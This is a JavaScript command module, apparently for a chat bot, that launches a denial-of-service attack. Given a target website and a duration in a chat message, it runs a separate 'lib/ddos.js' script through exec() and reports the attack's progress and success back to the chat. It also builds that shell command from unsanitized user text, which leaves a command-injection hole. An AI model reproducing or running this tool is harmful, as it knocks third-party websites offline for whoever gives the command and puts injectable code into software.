const { exec } = require('child_process');

exports.run = {
usage: ['ddos'],
hidden: ['mix'],
use: '<target> <time>',
category: 'owner',
async: async (m, { func, mecha }) => {
if (!m.text.includes(" ")) {
return m.reply("Use Methode: " + m.cmd + " <target> <time>\nExample: " + m.cmd + " example.my.id 60");
}
const url = m.text.substring(0, m.text.indexOf(" ") - 0);
const time = m.text.substring(m.text.lastIndexOf(" ") + 1);
m.reply("Attack Website Are Being Processed...\n- *Target* : " + url + "\n- *Time Attack* : " + time);
exec("node lib/ddos.js " + url + " " + time, {
'maxBuffer': 1048576
}, (data, response, error) => {
if (data) {
m.reply("Error: " + data.message);
return;
}
if (error) {
m.reply('Attack Website telah berhasil dilakukan');
return;
}
m.reply("Successfully DDOS\n\n- Target: " + url + "\n- Time: " + time);
});
},
devs: true
}